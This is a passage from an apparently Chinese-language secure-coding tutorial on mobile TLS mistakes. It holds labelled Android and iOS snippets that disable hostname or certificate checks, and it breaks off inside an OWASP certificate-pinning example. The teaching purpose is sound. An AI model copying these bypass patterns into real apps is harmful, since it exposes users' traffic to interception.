&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;android-3&quot;&gt;Android 錯誤處理情況3&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ALLOW_ALL_HOSTNAME_VERIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;或是&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HostnameVerifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allHostVerifier&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;上述寫法略過了憑證中的 hostname 檢查，導致即使連線端與憑證中指定的 hostname 不一致也能通過。較為恰當的做法是不特別設定，讓他使用預設的 DefaultHostnameVerifier，或是採用更為嚴謹的 StrictHostnameVerifier。&lt;/p&gt;

&lt;h4 id=&quot;ios-1&quot;&gt;iOS 錯誤處理情況1&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;@implementation&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;NSURLRequest&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;(IgnoreSSL)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;allowsAnyHTTPSCertificateForHost:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;YES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;@end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;此情況使用到 Framework 中的 Private API，雖然這種寫法會因為不能通過 Apple 的審查而不會出現在 AppStore 上(使用回避技巧不在這討論範圍內)，但仍有機會在無需經過 Apple 審查的 Enterprise App 中使用。較為適當的做法是用 “#if DEBUG”，”#endif” 包起來以確保該段程式在編譯時只能對開發中的 debug 版上有作用。&lt;/p&gt;

&lt;h4 id=&quot;ios-2&quot;&gt;iOS 錯誤處理情況2&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;canAuthenticateAgainstProtectionSpace:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;continueWithoutCredentialForAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;上面的做法會讓使用 NSURLConnection 的連線略過憑證檢查，容許任意憑證通過。下面節錄 OWASP WIKI 上的範例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autorelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;UInt8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetBytePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSUInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;random-org&amp;quot;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;der&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt; 
